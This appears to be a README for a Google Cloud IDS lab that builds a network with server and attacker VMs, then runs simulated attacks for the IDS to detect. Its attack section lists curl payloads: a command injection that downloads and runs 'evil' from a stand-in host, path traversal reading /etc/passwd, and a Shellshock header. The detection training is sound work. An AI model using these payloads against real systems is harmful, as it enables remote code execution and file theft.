# Cloud Cloud Intrusion Detection System

This project demonstrates how to deploy and configure Google Cloud Intrusion Detection System (Cloud IDS) to detect and analyze security threats in your network infrastructure.

## Video 

https://youtu.be/_TF7yUi6uOo

## Overview 

Cloud IDS is a next-generation advanced intrusion detection service that provides threat detection for intrusions, malware, spyware, and command-and-control attacks. This lab simulates multiple attack scenarios and shows how to view threat details in the Google Cloud console.

## Architecture 

The lab creates the following infrastructure:
- Custom VPC network with subnet in us-east1
- Cloud IDS endpoint for threat detection
- Two Compute Engine VMs (server and attacker)
- Packet mirroring policy to capture traffic
- Firewall rules and Cloud NAT for connectivity

## Prerequisites

- Google Cloud Project with billing enabled
- Appropriate IAM permissions for:
  - Compute Engine
  - VPC networks
  - Cloud IDS
  - Service Networking
- Google Cloud SDK (gcloud) installed and authenticated

## Required APIs

The following APIs need to be enabled:
- Service Networking API
- Cloud IDS API  
- Cloud Logging API
- Compute Engine API

## Setup Instructions

### 1. Environment Setup

Clone this repository and navigate to the project directory:

```bash
git clone <your-repo-url>
cd cloud-ids-lab
```

Set your project ID:
```bash
export PROJECT_ID=your-project-id
gcloud config set project $PROJECT_ID
```

### 2. Run the Setup Script

Execute the main setup script:
```bash
chmod +x setup-cloud-ids.sh
./setup-cloud-ids.sh
```

Or follow the manual steps below.

### 3. Manual Setup Steps

#### Enable Required APIs
```bash
# Set project ID variable
export PROJECT_ID=$(gcloud config get-value project | sed '2d')

# Enable APIs
gcloud services enable servicenetworking.googleapis.com --project=$PROJECT_ID
gcloud services enable ids.googleapis.com --project=$PROJECT_ID
gcloud services enable logging.googleapis.com --project=$PROJECT_ID
```

#### Create Network Infrastructure
```bash
# Create VPC
gcloud compute networks create cloud-ids --subnet-mode=custom

# Add subnet
gcloud compute networks subnets create cloud-ids-useast1 \
  --range=192.168.10.0/24 \
  --network=cloud-ids \
  --region=us-east1

# Configure private services access
gcloud compute addresses create cloud-ids-ips \
  --global \
  --purpose=VPC_PEERING \
  --addresses=10.10.10.0 \
  --prefix-length=24 \
  --description="Cloud IDS Range" \
  --network=cloud-ids

# Create private connection
gcloud services vpc-peerings connect \
  --service=servicenetworking.googleapis.com \
  --ranges=cloud-ids-ips \
  --network=cloud-ids \
  --project=$PROJECT_ID
```

#### Create Cloud IDS Endpoint
```bash
# Create IDS endpoint (takes ~20 minutes)
gcloud ids endpoints create cloud-ids-east1 \
  --network=cloud-ids \
  --zone=us-east1-b \
  --severity=INFORMATIONAL \
  --async

# Check status
gcloud ids endpoints list --project=$PROJECT_ID
```

#### Configure Firewall and NAT
```bash
# Create firewall rules
gcloud compute firewall-rules create allow-http-icmp \
  --direction=INGRESS \
  --priority=1000 \
  --network=cloud-ids \
  --action=ALLOW \
  --rules=tcp:80,icmp \
  --source-ranges=0.0.0.0/0 \
  --target-tags=server

gcloud compute firewall-rules create allow-iap-proxy \
  --direction=INGRESS \
  --priority=1000 \
  --network=cloud-ids \
  --action=ALLOW \
  --rules=tcp:22 \
  --source-ranges=35.235.240.0/20

# Create Cloud Router and NAT
gcloud compute routers create cr-cloud-ids-useast1 \
  --region=us-east1 \
  --network=cloud-ids

gcloud compute routers nats create nat-cloud-ids-useast1 \
  --router=cr-cloud-ids-useast1 \
  --router-region=us-east1 \
  --auto-allocate-nat-external-ips \
  --nat-all-subnet-ip-ranges
```

#### Create Virtual Machines
```bash
# Create server VM
gcloud compute instances create server \
  --zone=us-east1-b \
  --machine-type=e2-medium \
  --subnet=cloud-ids-useast1 \
  --no-address \
  --private-network-ip=192.168.10.20 \
  --metadata=startup-script='#!/bin/bash
sudo apt-get update
sudo apt-get -qq -y install nginx' \
  --tags=server \
  --image=debian-11-bullseye-v20240709 \
  --image-project=debian-cloud \
  --boot-disk-size=10GB

# Create attacker VM
gcloud compute instances create attacker \
  --zone=us-east1-b \
  --machine-type=e2-medium \
  --subnet=cloud-ids-useast1 \
  --no-address \
  --private-network-ip=192.168.10.10 \
  --image=debian-11-bullseye-v20240709 \
  --image-project=debian-cloud \
  --boot-disk-size=10GB
```

#### Setup Packet Mirroring
```bash
# Wait for IDS endpoint to be ready
while [[ $(gcloud ids endpoints list --project=$PROJECT_ID --format="value(state)" --filter="name:cloud-ids-east1") != "READY" ]]; do
  echo "Waiting for IDS endpoint to be ready..."
  sleep 60
done

# Get forwarding rule
export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")

# Create packet mirroring policy
gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
  --region=us-east1 \
  --collector-ilb=$FORWARDING_RULE \
  --network=cloud-ids \
  --mirrored-subnets=cloud-ids-useast1
```

## Testing and Attack Simulation

### 1. Prepare the Server

Connect to the server and create test files:
```bash
# SSH to server
gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap

# Check nginx status
sudo systemctl status nginx

# Create test malware file
cd /var/www/html/
sudo touch eicar.file
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file

# Exit server
exit
```

### 2. Run Attack Simulations

Execute the attack simulation script:
```bash
chmod +x simulate-attacks.sh
./simulate-attacks.sh
```

Or run manual attacks:
```bash
# SSH to attacker VM
gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap

# Run attack commands
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
curl http://192.168.10.20/?item=../../../../WINNT/win.ini
curl http://192.168.10.20/eicar.file
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical

# Exit attacker VM
exit
```

## Viewing Threat Detection Results

1. Navigate to **Network Security > Cloud IDS** in the Google Cloud Console
2. Click the **Threats** tab to view detected threats
3. Click **More** > **View threat details** for detailed analysis
4. Click **More** > **View threat logs** to see logs in Cloud Logging

## Cleanup

To avoid ongoing charges, clean up the resources:
```bash
chmod +x cleanup.sh
./cleanup.sh
```

## Security Considerations

- VMs are created without public IP addresses for security
- IAP (Identity-Aware Proxy) is used for secure SSH access
- Cloud NAT provides outbound internet access for updates
- Firewall rules are restrictive and purpose-built

## Troubleshooting

### Common Issues

1. **IDS Endpoint Creation Timeout**: The endpoint creation takes approximately 20 minutes. Be patient and check status with:
   ```bash
   gcloud ids endpoints list --project=$PROJECT_ID
   ```

2. **SSH Connection Issues**: Ensure IAP is enabled and your account has the necessary permissions:
   ```bash
   gcloud auth login
   gcloud config set project $PROJECT_ID
   ```

3. **No Threats Detected**: Wait a few minutes after running attacks, then refresh the Cloud IDS console.

## Additional Resources

- [Cloud IDS Documentation](https://cloud.google.com/intrusion-detection-system/docs)
- [VPC Packet Mirroring](https://cloud.google.com/vpc/docs/packet-mirroring)
- [Cloud Logging](https://cloud.google.com/logging/docs)

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Support

For issues related to this lab setup, please create an issue in this repository.
For Google Cloud support, visit the [Google Cloud Support Center](https://cloud.google.com/support).
